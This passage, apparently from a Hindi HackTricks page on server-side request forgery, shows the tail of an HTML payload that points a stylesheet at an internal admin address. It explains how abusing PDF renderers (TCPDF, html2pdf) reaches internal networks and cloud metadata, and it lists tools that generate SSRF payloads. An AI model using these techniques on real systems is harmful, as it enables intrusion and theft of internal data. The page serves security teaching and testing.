<link rel="stylesheet" type="text/css" href="http://10.0.0.5/admin" />
</body>
</html>
```
- TCPDF 6.10.0 प्रत्येक `<img>` resource के लिए कई retrieval attempts जारी करता है, इसलिए एक ही payload कई requests उत्पन्न कर सकता है (timing-based port scans में मददगार)।
- html2pdf `<img>` के लिए TCPDF के व्यवहार की नकल करता है और `Css::extractStyle()` के अंदर CSS fetching जोड़ता है, जो एक हल्की scheme जाँच के बाद बस `file_get_contents($href)` कॉल करता है। इसे loopback services, RFC1918 ranges, या cloud metadata endpoints पर हिट करने के लिए abuse करें।
- इस SSRF primitive को [HTML-to-PDF path traversal tricks](../file-inclusion/README.md#html-to-pdf-svgimg-path-traversal) के साथ जोड़ें ताकि यह internal HTTP responses और local files जो PDF में render होते हैं, दोनों को leak कर सके।

हार्डनर्स को rendering से पहले external URLs को हटाना चाहिए या renderer को network sandbox में isolate करना चाहिए; तब तक PDF generators को blind SSRF proxies की तरह माना जाना चाहिए।

## क्लाउड SSRF Exploitation

यदि आप किसी मशीन में जो क्लाउड environment के अंदर चल रही है SSRF vulnerability पाते हैं, तो आप क्लाउड environment के बारे में रोचक जानकारी और यहां तक कि credentials भी प्राप्त कर सकते हैं:


{{#ref}}
cloud-ssrf.md
{{#endref}}

## SSRF कमजोर प्लेटफ़ॉर्म

कई ज्ञात प्लेटफ़ॉर्म में SSRF कमजोरियाँ मौजूद हैं या रही हैं, उन्हें यहाँ पर देखें:


{{#ref}}
ssrf-vulnerable-platforms.md
{{#endref}}

## टूल्स

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

SSRF कमजोरियों का पता लगाने और exploit करने का टूल

### [Gopherus](https://github.com/tarunkant/Gopherus)

- [Blog post on Gopherus](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

यह टूल निम्न के लिए Gopher payloads जनरेट करता है:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- Zabbix
- Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

- [Blog post on SSRF usage](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_ एक _Java RMI_ vulnerability scanner है जो अधिकांश सामान्य _Java RMI_ कमजोरियों के लिए attack operations का समर्थन करता है। उपलब्ध अधिकांश operations `--ssrf` विकल्प का समर्थन करते हैं, जो अनुरोधित operation के लिए एक _SSRF_ payload जेनरेट करने के लिए है। `--gopher` विकल्प के साथ, ready to use _gopher_ payloads सीधे जेनरेट किए जा सकते हैं।

### [SSRF Proxy](https://github.com/bcoles/ssrf_proxy)

SSRF Proxy एक multi-threaded HTTP proxy server है जिसे ऐसे HTTP servers के माध्यम से client HTTP ट्रैफ़िक को tunnel करने के लिए डिज़ाइन किया गया है जो Server-Side Request Forgery (SSRF) के लिए vulnerable हैं।

### अभ्यास के लिए


{{#ref}}
https://github.com/incredibleindishell/SSRF_Vulnerable_Lab
{{#endref}}

## संदर्भ

- [https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4](https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/](https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/)
- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [Tenable – SSRF Vulnerability in Java TLS Handshakes That Creates DoS Risk](https://www.tenable.com/blog/tenable-discovers-ssrf-vulnerability-in-java-tls-handshakes-that-creates-dos-risk)
- [RFC 5280 §4.2.2.1 Authority Information Access](https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.2.1)

{{#include ../../banners/hacktricks-training.md}}
